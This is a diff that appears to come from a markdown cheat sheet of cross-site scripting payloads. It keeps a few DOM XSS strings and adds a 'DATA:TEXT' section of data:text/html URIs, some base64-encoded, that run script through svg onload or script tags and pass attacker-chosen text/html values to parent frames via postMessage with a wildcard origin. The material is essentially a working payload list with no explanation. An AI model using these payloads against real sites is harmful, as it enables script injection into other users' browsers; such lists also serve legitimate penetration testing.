@@ -15,6 +15,7 @@ this will cause Content-Disposition to throw its content into the file
 ```
 
 
+
 **Nice DOM XSS:**
 ```
 ','z':alert(1)//
@@ -26,9 +27,26 @@ http://example.com/','z':alert(1)//
 %3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3e
 ```
 
+**DATA:TEXT**
 
-
-
+```
+html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4=,
+```
+```
+data:text/html;var%20text=text;var%20html=html;alert(xss)//;base64,PGh0bWw+PGJvZHkgb25sb2FkPXhzcygpPjxzY3JpcHQ+IGZ1bmN0aW9uIHhzcygpIHsgcGFyZW50LnBvc3RNZXNzYWdlKHsneHNzJzogIm4wdG0zIn0sICcqJyk7IH07IDwvc2NyaXB0Pg==
+```
+```
+data:text/html,alert()//%253Csvg/onload=%27top.postMessage(%7B%22text%22:%201%7D,%20%22*%22);top.postMessage(%7B%22html%22:%201%7D,%20%22*%22)%27%253E
+```
+```
+data:text/html;var%20text=alert%28%29;var%20html;base64,YWE8c3ZnL29ubG9hZD0idG9wLnBvc3RNZXNzYWdlKDAsJyonKSI+11
+```
+```
+data:text/html,alert(document.domain);//%253csvg%20onload=%22parent.postMessage({text:4,html:1},'*');%22%253e
+```
+```
+data:text/html,alert(document.domain)//%253C%2553cript%253Ewindow.parent.postMessage({text:%22%22,html:%22%22}%2C%20%22*%22)%253C%2F%2553cript%253E
+```
 
 
 
